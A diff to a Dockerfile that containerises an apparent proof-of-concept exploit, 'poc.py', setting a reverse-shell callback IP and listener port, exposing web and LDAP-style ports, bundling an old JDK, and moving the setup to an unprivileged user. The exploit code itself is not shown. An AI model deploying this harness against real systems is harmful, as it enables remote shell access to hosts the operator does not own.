@@ -1,19 +1,20 @@
 FROM python:3.9-bullseye
 
 ENV RSHELL_PORT="9001"
-ENV RSHELL_IP="127.0.0.1"
+ENV RSHELL_IP="localhost"
 
 EXPOSE 8000/tcp
 EXPOSE 1389/tcp
 
-RUN pip3 install colorama argparse
+RUN adduser --group poc --system --home /home/poc --shell /bin/bash
+USER poc
 
-COPY poc.py /root/poc.py
-COPY requirements.txt /root/requirements.txt
-COPY target /root/target
-COPY jdk1.8.0_20 /root/jdk1.8.0_20
+COPY poc.py /home/poc/poc.py
+COPY requirements.txt /home/poc/requirements.txt
+COPY target /home/poc/target
+COPY jdk1.8.0_20 /home/poc/jdk1.8.0_20
 
+WORKDIR /home/poc
+RUN pip3 install -r requirements.txt
 
-WORKDIR /root
-
-CMD ["python3", "poc.py", "--userip", "${RSHELL_IP}", "--webport", "8000", "--lport", "${RSHELL_PORT}"]
+CMD python3 poc.py --userip $RSHELL_IP --webport 8000 --lport $RSHELL_PORT
